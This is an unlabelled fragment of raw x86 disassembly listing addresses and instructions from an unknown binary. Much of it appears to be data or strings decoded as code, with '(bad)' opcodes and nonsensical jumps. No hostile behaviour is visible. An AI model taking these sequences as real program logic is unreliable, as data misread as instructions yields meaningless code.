  421a71:	add    BYTE PTR [eax+edx*4],dl
  421a74:	inc    edx
  421a75:	add    BYTE PTR [eax],bl
  421a77:	nop
  421a78:	inc    edx
  421a79:	add    BYTE PTR [eax+edx*4],bl
  421a7c:	inc    edx
  421a7d:	add    BYTE PTR [eax],al
  421a7f:	mov    al,ds:0xa0040042
  421a84:	inc    edx
  421a85:	add    BYTE PTR [eax],cl
  421a87:	mov    al,ds:0xa00c0042
  421a8c:	inc    edx
  421a8d:	add    BYTE PTR [eax],dl
  421a8f:	mov    al,ds:0xa0140042
  421a94:	inc    edx
  421a95:	add    BYTE PTR [eax],bl
  421a97:	mov    al,ds:0xa01c0042
  421a9c:	inc    edx
  421a9d:	add    BYTE PTR [eax],al
  421a9f:	mov    al,0x42
  421aa1:	add    BYTE PTR [eax+esi*4],al
  421aa4:	inc    edx
  421aa5:	add    BYTE PTR [eax],cl
  421aa7:	mov    al,0x42
  421aa9:	add    BYTE PTR [eax+esi*4],cl
  421aac:	inc    edx
  421aad:	add    BYTE PTR [eax],dl
  421aaf:	mov    al,0x42
  421ab1:	add    BYTE PTR [eax+esi*4],dl
  421ab4:	inc    edx
  421ab5:	add    BYTE PTR [eax],bl
  421ab7:	mov    al,0x42
  421ab9:	add    BYTE PTR [eax+esi*4],bl
  421abc:	inc    edx
  421abd:	add    BYTE PTR [eax+0x66],bh
  421ac0:	ins    BYTE PTR es:[edi],dx
  421ac1:	jp     0x421b1a
  421ac3:	jbe    0x421b0c
  421ac5:	ja     0x421b0a
  421ac7:	js     0x421b11
  421ac9:	jno    0x421b2e
  421acb:	inc    edx
  421acc:	inc    bx
  421ace:	push   ebp
  421acf:	jno    0x421b47
  421ad1:	ja     0x421b3a
  421ad3:	dec    edi
  421ad4:	dec    esp
  421ad5:	dec    ebp
  421ad6:	inc    edx
  421ad7:	jno    0x421b4a
  421ad9:	jae    0x421b2e
  421adb:	push   eax
  421adc:	arpl   WORD PTR [ebx-0x7a],dx
  421adf:	push   ds
  421ae0:	inc    edx
  421ae1:	add    BYTE PTR [esi+0x2600421e],cl
  421ae7:	sbb    eax,0xbef0042
  421aec:	mov    dl,0xe
  421aee:	jns    0x421b3e
  421af0:	xor    BYTE PTR [esi-0x79],cl
  421af3:	dec    edi
  421af4:	cmp    eax,0x3e4faf4e
  421af9:	dec    esi
  421afa:	js     0x421b4a
  421afc:	cmp    ecx,DWORD PTR [esi-0x64]
  421aff:	dec    edi
  421b00:	inc    esp
  421b01:	dec    esi
  421b02:	jae    0x421b52
  421b04:	inc    ecx
  421b05:	dec    esi
  421b06:	xor    BYTE PTR [esi+0x40],cl
  421b09:	dec    esi
  421b0a:	pop    esp
  421b0b:	pop    ebp
  421b0c:	pop    edi
  421b0d:	push   edx
  421b0e:	cmp    DWORD PTR [esi+0x79],ecx
  421b11:	dec    esi
  421b12:	xor    BYTE PTR [esi-0x79],cl
  421b15:	dec    edi
  421b16:	cmp    eax,0x3e4faf4e
  421b1b:	dec    esi
  421b1c:	js     0x421b6c
  421b1e:	cmp    ecx,DWORD PTR [esi-0x64]
  421b21:	dec    edi
  421b22:	inc    esp
  421b23:	dec    esi
  421b24:	mov    DWORD PTR [edi+0x41],ecx
  421b27:	dec    esi
  421b28:	xor    BYTE PTR [esi+0x40],cl
  421b2b:	dec    esi
  421b2c:	pop    esp
  421b2d:	ins    DWORD PTR es:[edi],dx
  421b2e:	pop    edi
  421b2f:	bound  edi,QWORD PTR [ecx]
  421b31:	dec    esi
  421b32:	jns    0x421b82
  421b34:	xor    BYTE PTR [esi-0x80],cl
  421b37:	dec    edi
  421b38:	cmp    eax,0x394e734e
  421b3d:	dec    esi
  421b3e:	mov    ds:0x304e3a4f,al
  421b43:	dec    esi
  421b44:	inc    esi
  421b45:	dec    esi
  421b46:	pop    esp
  421b47:	jge    0x421ba8
  421b49:	jb     0x421bba
  421b4b:	sub    BYTE PTR [esi-0x7d],0x7e
  421b4f:	xchg   ebx,eax
  421b50:	jns    0x421ae2
  421b52:	aas    
  421b53:	dec    esi
  421b54:	test   BYTE PTR [edi+0x30],cl
  421b57:	dec    esi
  421b58:	test   BYTE PTR [edi+0x3c],cl
  421b5b:	dec    esi
  421b5c:	mov    ds:0x734e394f,al
  421b61:	dec    esi
  421b62:	inc    ebp
  421b63:	dec    esi
  421b64:	xor    BYTE PTR [esi+0x44],cl
  421b67:	dec    esi
  421b68:	pop    esp
  421b69:	lea    ebx,[edi-0x7e]
  421b6c:	outs   dx,DWORD PTR ds:[esi]
  421b6d:	xchg   edx,eax
  421b6e:	outs   dx,BYTE PTR ds:[esi]
  421b6f:	xchg   ebx,eax
  421b70:	jle    0x421b15
  421b72:	jns    0x421b14
  421b74:	aas    
  421b75:	dec    esi
  421b76:	test   BYTE PTR [edi+0x30],cl
  421b79:	dec    esi
  421b7a:	test   BYTE PTR [edi+0x3c],cl
  421b7d:	dec    esi
  421b7e:	mov    ds:0x894e394f,al
  421b83:	dec    edi
  421b84:	inc    ebp
  421b85:	dec    esi
  421b86:	xor    BYTE PTR [esi+0x44],cl
  421b89:	dec    esi
  421b8a:	pop    esp
  421b8b:	popf   
  421b8c:	pop    edi
  421b8d:	xchg   edx,eax
  421b8e:	outs   dx,DWORD PTR ds:[esi]
  421b8f:	mov    ds:0xb37ea36e,al
  421b94:	jns    0x421b46
  421b96:	aas    
  421b97:	dec    esi
  421b98:	mov    cs,WORD PTR [edi+0x30]
  421b9b:	dec    esi
  421b9c:	lods   al,BYTE PTR ds:[esi]
  421b9d:	dec    edi
  421b9e:	cmp    eax,0x394e734e
  421ba3:	dec    esi
  421ba4:	mov    eax,ds:0x304e3a4f
  421ba9:	dec    esi
  421baa:	inc    esp
  421bab:	dec    esi
  421bac:	pop    esp
  421bad:	lods   eax,DWORD PTR ds:[esi]
  421bae:	pop    edi
  421baf:	mov    ds:0xb36eb26f,al
  421bb4:	jle    0x421b79
  421bb6:	jns    0x421b78
  421bb8:	aas    
  421bb9:	dec    esi
  421bba:	mov    cs,WORD PTR [edi+0x30]
  421bbd:	dec    esi
  421bbe:	lods   al,BYTE PTR ds:[esi]
  421bbf:	dec    edi
  421bc0:	cmp    eax,0x394e7e4e
  421bc5:	dec    esi
  421bc6:	lahf   
  421bc7:	dec    edi
  421bc8:	cmp    ecx,DWORD PTR [esi+0x30]
  421bcb:	dec    esi
  421bcc:	inc    ebp
  421bcd:	dec    esi
  421bce:	pop    esp
  421bcf:	mov    ebp,0xc26fb25f
  421bd4:	outs   dx,BYTE PTR ds:[esi]
  421bd5:	ret    
  421bd6:	jle    0x421bab
  421bd8:	jns    0x421baa
  421bda:	aas    
  421bdb:	dec    esi
  421bdc:	mov    cs,WORD PTR [edi+0x30]
  421bdf:	dec    esi
  421be0:	lods   al,BYTE PTR ds:[esi]
  421be1:	dec    edi
  421be2:	cmp    eax,0x394f804e
  421be7:	dec    esi
  421be8:	lods   al,BYTE PTR ds:[esi]
  421be9:	dec    edi
  421bea:	cmp    cl,BYTE PTR [esi+0x30]
  421bed:	dec    esi
  421bee:	inc    esi
  421bef:	dec    esi
  421bf0:	pop    esp
  421bf1:	int    0x5f
  421bf3:	ret    0xd26f
  421bf6:	outs   dx,BYTE PTR ds:[esi]
  421bf7:	sar    DWORD PTR [esi-0x1d],cl
  421bfa:	jns    0x421bdc
  421bfc:	aas    
  421bfd:	dec    esi
  421bfe:	mov    cs,WORD PTR [edi+0x30]
  421c01:	dec    esi
  421c02:	lods   al,BYTE PTR ds:[esi]
  421c03:	dec    edi
  421c04:	cmp    eax,0x394f834e
  421c09:	dec    esi
  421c0a:	mov    ds:0x304e3a4f,al
  421c0f:	dec    esi
  421c10:	inc    esp
  421c11:	dec    esi
  421c12:	pop    esp
  421c13:	fstp   QWORD PTR [edi-0x2e]
  421c16:	outs   dx,DWORD PTR ds:[esi]
  421c17:	loop   0x421c87
  421c19:	jecxz  0x421c99
  421c1b:	repz jns 0x421c0e
  421c1e:	aas    
  421c1f:	dec    esi
  421c20:	lea    ecx,[edi+0x30]
  421c23:	dec    esi
  421c24:	lahf   
  421c25:	dec    edi
  421c26:	cmp    eax,0x3c4fa04e
  421c2b:	dec    esi
  421c2c:	xor    BYTE PTR [esi+0x3f],cl
  421c2f:	dec    esi
  421c30:	pop    esp
  421c31:	in     eax,dx
  421c32:	pop    edi
  421c33:	loop   0x421ca4
  421c35:	repnz outs dx,BYTE PTR ds:[esi]
  421c37:	repz jle 0x421c3d
  421c3a:	jns    0x421c3c
  421c3c:	jle    0x421c51
  421c3e:	jns    0x421c50
  421c40:	cmp    al,0x4e
  421c42:	jg     0x421c92
  421c44:	xor    BYTE PTR [esi-0x65],cl
  421c47:	dec    edi
  421c48:	xor    cl,BYTE PTR [esi-0x80]
  421c4b:	dec    edi
  421c4c:	cmp    al,0x4e
  421c4e:	lods   eax,DWORD PTR ds:[esi]
  421c4f:	dec    edi
  421c50:	cmp    ecx,DWORD PTR [esi+0x30]
  421c53:	dec    esi
  421c54:	inc    ebp
  421c55:	dec    esi
  421c56:	pop    esp
  421c57:	or     eax,0x126f025f
  421c5c:	outs   dx,BYTE PTR ds:[esi]
  421c5d:	adc    edi,DWORD PTR [esi+0x23]
  421c60:	jns    0x421c82
  421c62:	aas    
  421c63:	dec    esi
  421c64:	add    BYTE PTR [eax],al
  421c66:	out    dx,al
  421c67:	sbb    al,BYTE PTR [edx+0x0]
  421c6a:	loop   0x421c88
  421c6c:	inc    edx
  421c6d:	add    dl,ch
  421c6f:	sbb    al,0x42
  421c71:	add    BYTE PTR [edx-0x1ffbde2],dl
  421c77:	sbb    eax,0x1e820042
  421c7c:	inc    edx
  421c7d:	add    dl,cl
  421c7f:	sbb    al,0x42
  421c81:	add    dh,cl
  421c83:	sbb    al,0x42
  421c85:	add    BYTE PTR [esi+0x1e],bh
  421c88:	inc    edx
  421c89:	add    BYTE PTR [edx],dh
  421c8b:	sbb    eax,0xa90d0042
  421c90:	pushf  
  421c91:	clc    
  421c92:	ss mov edx,0x1ce6f89c
  421c98:	inc    edx
  421c99:	add    BYTE PTR [esi-0x35ffbde3],dh
  421c9f:	sbb    eax,0x1dd60042
  421ca4:	inc    edx
  421ca5:	add    dh,ah
  421ca7:	sbb    eax,0x1d1e0042
  421cac:	inc    edx
  421cad:	add    dl,ch
  421caf:	sbb    al,BYTE PTR [edx+0x0]
  421cb2:	ds sbb eax,0x1d2e0042
  421cb8:	inc    edx
  421cb9:	add    BYTE PTR [esi-0x49ffbde2],dl
  421cbf:	test   DWORD PTR [eax+edi*8-0x7ee8f4e7],ebx
  421cc6:	repnz sbb al,0x42
  421cc9:	add    BYTE PTR [esp+ebx*1],dl
  421ccc:	push   ss
  421ccd:	or     DWORD PTR [eax],0x7050d
  421cd3:	add    BYTE PTR [eax+0x0],al
  421cd6:	cmp    al,BYTE PTR [edx+0x3e]
  421cd9:	ds enter 0x4279,0x0
  421cde:	ins    DWORD PTR es:[edi],dx
  421cdf:	push   ebp
  421ce0:	inc    esp
  421ce1:	imul   ecx,DWORD PTR [eax],0x86275fa
  421ce7:	in     eax,dx
  421ce8:	inc    BYTE PTR [edi]
  421cea:	aas    
  421ceb:	cli    
  421cec:	mov    ds:0x421cda05,eax
  421cf1:	add    BYTE PTR [ebp-0x4a07636b],dh
  421cf7:	xchg   esi,eax
  421cf8:	pushf  
  421cf9:	clc    
  421cfa:	mov    ah,0x95
  421cfc:	pushf  
  421cfd:	clc    
  421cfe:	mov    ebx,0xbaf89c95
  421d03:	xchg   ebp,eax
  421d04:	pushf  
  421d05:	clc    
  421d06:	mov    ecx,0xb8f89c95
  421d0b:	xchg   ebp,eax
  421d0c:	pushf  
  421d0d:	clc    
  421d0e:	mov    edi,0xbef89c95
  421d13:	xchg   ebp,eax
  421d14:	pushf  
  421d15:	clc    
  421d16:	mov    ebp,0xa6f89c95
  421d1b:	xchg   ebp,eax
  421d1c:	pushf  
  421d1d:	clc    
  421d1e:	jmp    0x421a:0xe26003f9
  421d25:	add    BYTE PTR [eax+eax*2+0x42],ch
  421d29:	add    BYTE PTR [ebx+0x77],dl
  421d2c:	jbe    0x421d7e
  421d2e:	mov    dh,0x85
  421d30:	pushf  
  421d31:	clc    
  421d32:	sbb    ecx,ebp
  421d34:	push   eax
  421d35:	pop    es
  421d36:	sbb    BYTE PTR [ebx],cl
  421d38:	add    BYTE PTR [eax],al
  421d3a:	ficomp WORD PTR [edx]
  421d3c:	inc    edx
  421d3d:	add    BYTE PTR [ebx],bl
  421d3f:	or     eax,DWORD PTR [esi+ecx*1]
	...
  421d72:	ins    BYTE PTR es:[edi],dx
  421d73:	inc    eax
  421d74:	inc    edx
  421d75:	add    BYTE PTR [esi+0x66f89c85],dh
  421d7b:	add    BYTE PTR [edx+0x0],ch
  421d7e:	add    BYTE PTR [si+0x0],ah
  421d82:	push   0x64006700
  421d87:	add    BYTE PTR [esi+0x0],ah
  421d8a:	push   0x0
  421d8c:	push   0x66006400
  421d91:	add    BYTE PTR [edi+0x0],ah
  421d94:	push   0x0
  421d96:	push   0x66006700
  421d9b:	add    BYTE PTR [eax+0x0],ch
  421d9e:	add    BYTE PTR [bp+0x0],ah
  421da2:	push   0x66006700
	...
  421daf:	add    BYTE PTR [eax],al
  421db1:	add    BYTE PTR [ecx-0x5affbfa4],cl
  421db7:	dec    edi
  421db8:	lahf   
  421db9:	dec    edi
  421dba:	mov    ds:0x9f4fa64f,al
  421dbf:	dec    edi
  421dc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421dc1:	dec    edi
  421dc2:	ins    DWORD PTR es:[edi],dx
  421dc3:	dec    esi
  421dc4:	bound  ecx,QWORD PTR [esi+0x30]
  421dc7:	dec    esi
  421dc8:	add    BYTE PTR [eax],al
  421dca:	cdq    
  421dcb:	dec    edi
  421dcc:	pushf  
  421dcd:	dec    edi
  421dce:	fwait
  421dcf:	dec    edi
  421dd0:	ins    DWORD PTR es:[edi],dx
  421dd1:	dec    esi
  421dd2:	bound  ecx,QWORD PTR [esi+0x30]
  421dd5:	dec    esi
  421dd6:	scas   eax,DWORD PTR es:[edi]
  421dd7:	dec    edi
  421dd8:	lods   eax,DWORD PTR ds:[esi]
  421dd9:	dec    edi
  421dda:	lahf   
  421ddb:	dec    edi
  421ddc:	mov    ds:0x624e6d4f,al
  421de1:	dec    esi
  421de2:	xor    BYTE PTR [esi+0x0],cl
  421de5:	add    BYTE PTR [ebp-0x5bb067b1],ch
  421deb:	dec    edi
  421dec:	test   eax,0xa04f934f
  421df1:	dec    edi
  421df2:	fwait
  421df3:	dec    edi
  421df4:	xor    BYTE PTR [esi+0x0],cl
  421df7:	add    BYTE PTR [eax],al
  421df9:	add    BYTE PTR [eax],al
  421dfb:	add    BYTE PTR [eax],al
  421dfd:	add    BYTE PTR [ebp+edi*2-0x62737274],cl
  421e04:	mov    WORD PTR [ebp-0x32734274],gs
  421e0a:	mov    ebp,ds
  421e0c:	mov    ebp,gs
  421e0e:	mov    ebp,?
  421e10:	mov    WORD PTR ds:0x2d8c1d8c,cs
  421e16:	mov    WORD PTR ds:0x6d8c5d8c,?
  421e1c:	mov    WORD PTR [edx-0x74],?
  421e1f:	jae    0x421dad
  421e21:	jo     0x421daf
  421e23:	jno    0x421db1
  421e25:	jbe    0x421db3
  421e27:	ja     0x421db5
  421e29:	je     0x421db7
  421e2b:	jne    0x421db9
  421e2d:	mov    cl,BYTE PTR [ebx+ecx*4-0x76737774]
  421e34:	mov    WORD PTR [esi+0x7d9c7c8c],cs
  421e3a:	lods   al,BYTE PTR ds:[esi]
  421e3b:	jge    0x421df9
  421e3d:	jge    0x421ddd
  421e3f:	(bad)  
  421e40:	jns    0x421eb5
  421e42:	mov    ecx,0x7d738cb1
  421e47:	ins    DWORD PTR es:[edi],dx
  421e48:	enter  0x9fc6,0x26
  421e4c:	jb     0x421e51
  421e4e:	test   eax,0xb956bb17
  421e53:	hlt    
  421e54:	test   al,0x37
  421e56:	test   al,0x7e
  421e58:	fnstenv [ecx-0x6a]
  421e5b:	mov    cl,0x6a
  421e5d:	push   0xffffffce
  421e5f:	or     BYTE PTR [edx],bl
  421e61:	xlat   BYTE PTR ds:[ebx]
  421e62:	out    dx,eax
  421e63:	add    eax,0x9321d7aa
  421e68:	scas   al,BYTE PTR es:[edi]
  421e69:	adc    DWORD PTR [esi],esp
  421e6b:	jge    0x421e90
  421e6d:	fidiv  WORD PTR [edi]
  421e6f:	leave  
  421e70:	hlt    
  421e71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e72:	cmp    ax,0x1fc8
  421e76:	mov    dh,cl
  421e78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e79:	(bad)  
  421e7a:	and    DWORD PTR [eax],ebx
  421e7c:	and    DWORD PTR [ecx-0x18],esi
  421e7f:	(bad)  [ebx+0x7]
  421e82:	cmc    
  421e83:	enter  0x301a,0x14
  421e87:	inc    eax
  421e88:	inc    edx
  421e89:	add    BYTE PTR [ecx+0x66],dh
  421e8c:	jp     0x421efc
  421e8e:	rcr    BYTE PTR [edx+eax*2],cl
  421e91:	add    BYTE PTR [esi],dh
  421e93:	sbb    eax,0xed080042
  421e98:	adc    al,BYTE PTR [edi]
  421e9a:	imul   esp,DWORD PTR [esi+0x4f],0x6f704c74
  421ea1:	ins    BYTE PTR es:[edi],dx
  421ea2:	push   0x49657557
  421ea7:	imul   eax,DWORD PTR fs:[ecx+edi*2+0x54],0x62
  421ead:	push   edi
  421eae:	jp     0x421f2a
  421eb0:	dec    ebp
  421eb1:	push   esi
  421eb2:	arpl   WORD PTR gs:[ecx+0x45],si
  421eb6:	dec    edx
  421eb7:	dec    esi
  421eb8:	data16 ja 0x421f09
  421ebb:	imul   ebp,DWORD PTR [eax+0x6e],0x76597148
	...
  421ed6:	inc    ebp
  421ed7:	push   edx
  421ed8:	jb     0x421f4e
  421eda:	inc    esi
  421edb:	je     0x421f1e
  421edd:	inc    esi
  421ede:	jae    0x421f56
  421ee0:	dec    ebx
  421ee1:	gs dec ecx
  421ee3:	dec    ebp
  421ee4:	dec    ebp
  421ee5:	pop    edx
  421ee6:	jp     0x421f42
  421ee8:	jbe    0x421f30
  421eea:	pop    ecx
  421eeb:	jo     0x421f65
  421eed:	inc    edi
  421eee:	gs ins BYTE PTR es:[edi],dx
  421ef0:	dec    esp
  421ef1:	js     0x421f5b
  421ef3:	inc    edx
  421ef4:	js     0x421f3c
  421ef6:	dec    eax
  421ef7:	inc    ebp
  421ef8:	inc    esp
  421ef9:	inc    esp
  421efa:	push   ecx
  421efb:	dec    edx
  421efc:	ins    BYTE PTR es:[edi],dx
  421efd:	dec    ebx
  421efe:	jbe    0x421f6e
  421f00:	pop    eax
  421f01:	jbe    0x421f4e
  421f03:	inc    ecx
  421f04:	fs gs jno 0x421f75
  421f08:	push   ebx
  421f09:	inc    ecx
  421f0a:	add    BYTE PTR [eax],al
  421f0c:	inc    ebx
  421f0d:	outs   dx,BYTE PTR ds:[esi]
  421f0e:	imul   esp,DWORD PTR [edi+0x7a],0x6f
  421f12:	push   edx
  421f13:	push   ecx
  421f14:	push   0x74000064
  421f19:	jne    0x421f90
  421f1b:	ins    DWORD PTR es:[edi],dx
  421f1c:	push   ecx
  421f1d:	push   eax
  421f1e:	jo     0x421f9a
  421f20:	addr16 jo 0x421f79
  421f23:	pop    eax
  421f24:	add    BYTE PTR [eax],al
  421f26:	push   ecx
  421f27:	pop    ecx
  421f28:	inc    ebx
  421f29:	inc    edx
  421f2a:	outs   dx,BYTE PTR ds:[esi]
  421f2b:	popa   
  421f2c:	imul   eax,DWORD PTR [edx+0x61],0x6b
  421f30:	jne    0x421fa0
  421f32:	dec    ebx
  421f33:	je     0x421f98
  421f35:	bound  esp,QWORD PTR [edi+0x0]
  421f38:	jns    0x421f7f
  421f3a:	bound  ebp,QWORD PTR [ecx+0x46]
  421f3d:	dec    ecx
  421f3e:	ja     0x421f85
  421f40:	dec    eax
  421f41:	inc    ebp
  421f42:	inc    edx
  421f43:	push   ebx
  421f44:	add    BYTE PTR [eax],al
  421f46:	outs   dx,DWORD PTR ds:[esi]
  421f47:	inc    edi
  421f48:	dec    esi
  421f49:	outs   dx,DWORD PTR ds:[esi]
  421f4a:	pop    ecx
  421f4b:	inc    edi
  421f4c:	jb     0x421f95
  421f4e:	jns    0x421fc6
  421f50:	inc    ecx
  421f51:	pop    eax
  421f52:	dec    esp
  421f53:	add    BYTE PTR [eax+0x48],bh
  421f56:	bound  edx,QWORD PTR [ebx+0x43]
  421f59:	pop    eax
  421f5a:	outs   dx,DWORD PTR ds:[esi]
  421f5b:	push   0x4355
  421f60:	dec    esp
  421f61:	ins    BYTE PTR es:[edi],dx
  421f62:	inc    edx
  421f63:	push   0x76666a73
  421f68:	inc    edx
  421f69:	jo     0x421f6b
  421f6b:	add    BYTE PTR [eax],al
  421f6d:	add    BYTE PTR [edi+0x6d],ah
  421f70:	je     0x421fb9
  421f72:	ins    BYTE PTR es:[edi],dx
  421f73:	jae    0x421fdf
  421f75:	inc    esi
  421f76:	ins    DWORD PTR es:[edi],dx
  421f77:	je     0x421fcf
  421f79:	push   0x56584178
  421f7e:	push   ebx
  421f7f:	addr16 dec edx
  421f81:	jo     0x421ff5
  421f83:	js     0x421ff4
  421f85:	pop    eax
  421f86:	dec    ebx
  421f87:	push   esp
  421f88:	dec    esp
  421f89:	jns    0x421fd6
  421f8b:	js     0x422005
  421f8d:	outs   dx,BYTE PTR ds:[esi]
  421f8e:	pop    ecx
  421f8f:	jae    0x421fff
  421f91:	push   0x43644448
  421f96:	arpl   WORD PTR [edx+0x55],sp
  421f99:	push   0x42504e67
  421f9e:	push   ebp
  421f9f:	je     0x422016
  421fa1:	addr16 dec edi
  421fa3:	dec    esp
  421fa4:	inc    edx
  421fa5:	ins    DWORD PTR es:[edi],dx
  421fa6:	inc    esi
  421fa7:	inc    esi
  421fa8:	inc    esi
  421fa9:	arpl   WORD PTR [edx+0x47],bx
  421fac:	push   ebp
  421fad:	inc    ebx
  421fae:	popa   
  421faf:	push   edx
  421fb0:	dec    esp
  421fb1:	imul   ecx,DWORD PTR [ecx+0x43],0x54706a5a
  421fb8:	push   ecx
  421fb9:	push   ebx
  421fba:	imul   ebp,DWORD PTR [ebx+0x52],0x444a454e
  421fc1:	dec    edx
  421fc2:	jns    0x42202d
  421fc4:	push   edx
  421fc5:	inc    ebx
  421fc6:	jo     0x42203d
  421fc8:	imul   ecx,DWORD PTR [ebx+0x50],0x48
  421fcc:	fs push ebx
  421fce:	inc    ebx
  421fcf:	push   ebp
  421fd0:	push   eax
  421fd1:	ja     0x42200e
  421fd3:	fisttp QWORD PTR [ebp+ebp*4-0x12]
  421fd7:	mov    ebp,0xa53ddffb
  421fdc:	js     0x421f97
  421fde:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  421fe0:	ins    BYTE PTR es:[edi],dx
  421fe1:	mov    bh,0x22
  421fe3:	xlat   BYTE PTR ds:[ebx]
  421fe4:	add    DWORD PTR [eax],eax
  421fe6:	arpl   WORD PTR [eax],ax
  421fe8:	add    BYTE PTR [eax],al
  421fea:	imul   ebp,DWORD PTR ds:0x4976a086,0x6
  421ff1:	fisub  WORD PTR [ecx-0xc09fa9]
  421ff7:	jne    0x421fe3
  421ff9:	pop    ds
  421ffa:	cdq    
  421ffb:	or     esi,esp
  421ffd:	inc    edx
  421ffe:	sbb    edx,DWORD PTR [ecx+0x23febe15]
  422004:	loop   0x422018
  422006:	ret    0x1a47
  422009:	outs   dx,BYTE PTR es:[esi]
  42200b:	mov    ecx,0x1b6074b
  422010:	pop    ecx
  422011:	imul   esp,DWORD PTR [ebx],0xffffffc4
  422014:	lock mov ebx,0x535f1bed
  42201a:	xchg   edi,eax
  42201b:	dec    ebx
  42201c:	jne    0x421fe7
  42201e:	and    ah,bh
  422020:	imul   ebx,DWORD PTR [eax-0x2cfa500e],0xffffffec
  422027:	mov    ebx,DWORD PTR [esi+0x15]
  42202a:	pop    ss
  42202b:	fwait
  42202c:	push   cs
  42202d:	pop    ebp
  42202e:	sub    eax,0x766d1037
  422033:	mov    cs,WORD PTR [eax-0xba6a2b2]
  422039:	cwde   
  42203a:	cmp    BYTE PTR [eax],bl
  42203c:	push   eax
  42203d:	or     eax,0xe05408ad
  422042:	imul   edi,DWORD PTR [ecx+0x7f],0x7e
  422046:	stc    
  422047:	or     ch,BYTE PTR [eax*1+0x5dc7b]
  42204e:	add    BYTE PTR [eax],al
  422050:	add    BYTE PTR [eax],al
  422052:	sub    BYTE PTR [edx+0x57bf52a5],dh
  422058:	(bad)  
  422059:	cli    
  42205a:	jl     0x4220c0
  42205c:	xlat   BYTE PTR ds:[ebx]
  42205d:	push   esi
  42205e:	jno    0x42207e
  422060:	call   0x6300:0x1d785ba
  422067:	add    BYTE PTR [eax],al
  422069:	add    BYTE PTR [edx],bl
  42206b:	cmp    al,cl
  42206d:	push   ss
  42206e:	(bad)  
  42206f:	xchg   edi,eax
  422070:	jb     0x42207c
  422072:	fld    QWORD PTR [edi+edx*1]
  422075:	push   esi
  422076:	aad    0x86
  422078:	call   DWORD PTR [edi+0x203c5901]
  42207e:	lock ds sub eax,0x5628ca09
  422085:	and    cl,BYTE PTR [edi+0x64]
  422088:	ds push esp
  42208a:	pop    es
  42208b:	fmul   DWORD PTR [ebx]
  42208d:	push   ebp
  42208e:	and    al,0xdd
  422090:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422091:	sbb    ecx,esi
  422093:	sub    dl,ah
  422095:	stc    
  422096:	dec    eax
  422097:	sbb    DWORD PTR [esi+0x7be03bb6],edi
  42209d:	or     al,0xf4
  42209f:	in     al,dx
  4220a0:	outs   dx,BYTE PTR ds:[esi]
  4220a1:	lds    edx,FWORD PTR [esi]
  4220a3:	test   DWORD PTR [esi+ebp*1-0x6cb8ae92],ebp
  4220aa:	popf   
  4220ab:	jl     0x42209b
  4220ad:	fiadd  WORD PTR [eax+ebx*2-0x70af5978]
  4220b4:	mov    ebx,0x848ba90c
  4220b9:	xor    ch,BYTE PTR [edi+0x43]
  4220bc:	or     DWORD PTR [ebx+0x5f],edi
  4220bf:	and    ah,dh
  4220c1:	inc    esi
  4220c2:	(bad)  
  4220c3:	fst    st(6)
  4220c5:	aas    
  4220c6:	cs dec edx
  4220c8:	xlat   BYTE PTR ds:[ebx]
  4220c9:	lea    edi,[eiz*8+0x16]
  4220d0:	add    BYTE PTR [eax],al
  4220d2:	mov    bl,0x55
  4220d4:	jg     0x422057
  4220d6:	jmp    FWORD PTR [ebx-0x69418801]
  4220dc:	push   0xdeddf857
  4220e1:	test   eax,ebp
  4220e3:	xlat   BYTE PTR ds:[ebx]
  4220e4:	add    DWORD PTR [eax],eax
  4220e6:	arpl   WORD PTR [eax],ax
  4220e8:	add    BYTE PTR [eax],al
  4220ea:	mov    DWORD PTR [ebx+0x47103f1a],edx
  4220f0:	test   bl,bl
  4220f2:	aad    0xb0
  4220f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4220f5:	push   eax
  4220f6:	push   ebp
  4220f7:	test   eax,0x969e6626
  4220fc:	test   al,0x29
  4220fe:	out    0xf0,al
  422100:	aam    0x68
  422102:	mov    bh,0xc9
  422104:	das    
  422105:	inc    eax
  422106:	pushf  
  422107:	ja     0x42210f
  422109:	inc    esp
  42210a:	nop
  42210b:	dec    edx
  42210c:	test   eax,edi
  42210e:	fs jmp 0x422125
  422111:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422112:	loop   0x422150
  422114:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422115:	mov    edx,0x8c9fde9d
  42211a:	outs   dx,BYTE PTR ds:[esi]
  42211b:	sub    eax,0xab85570d
  422120:	mov    cl,0xc9
  422122:	retf   
  422123:	pop    es
  422124:	xchg   DWORD PTR [eax+0x74],eax
  422127:	jp     0x42214e
  422129:	fiadd  WORD PTR [ebp+eiz*4+0x3d]
  42212d:	mov    edx,0x4e886e12
  422132:	inc    ebx
  422133:	test   al,0x7f
  422135:	mov    ah,0xb8
  422137:	les    ebx,FWORD PTR es:[esi]
  42213a:	inc    BYTE PTR [eax+0x412d434b]
  422140:	call   0x9b7e52f3
  422145:	bound  ecx,QWORD PTR ss:[edx+ebx*2+0x34]
  42214a:	push   edx
  42214b:	lahf   
  42214c:	push   ss
  42214d:	add    BYTE PTR [eax],al
  42214f:	add    BYTE PTR [eax],al
  422151:	add    BYTE PTR [eax],bh
  422153:	(bad)  
  422154:	cmp    ah,BYTE PTR [esi+edi*8]
  422157:	in     al,dx
  422158:	fimul  WORD PTR ds:[edi-0x1e53942b]
  42215f:	mov    dh,0x13
  422161:	ror    BYTE PTR [ebx-0x28],cl
  422164:	add    DWORD PTR [eax],eax
  422166:	arpl   WORD PTR [eax],ax
  422168:	add    BYTE PTR [eax],al
  42216a:	mov    DWORD PTR [ebx-0x69],0x6ee0d87e
  422171:	repz hlt 
  422173:	inc    edx
  422174:	jb     0x4221a0
  422176:	mov    cl,0xab
  422178:	repz mov ebx,0x37ef3b71
  42217e:	pop    bp
  422180:	mov    ebp,0xfa66bff8
  422185:	mov    eax,ds:0x10dce795
  42218a:	pop    edx
  42218b:	sub    eax,0xf0e75615
  422190:	idiv   cl
  422192:	add    eax,0x74
  422195:	inc    eax
  422196:	jge    0x42212b
  422198:	popa   
  422199:	cli    
  42219a:	fwait
  42219b:	jge    0x42219f
  42219d:	cs lock jb 0x4221e1
  4221a1:	push   edx
  4221a2:	repz dec esi
  4221a4:	push   ecx
  4221a5:	pop    edx
  4221a6:	leave  
  4221a7:	pop    es
  4221a8:	sahf   
  4221a9:	mov    edi,0xb055ece8
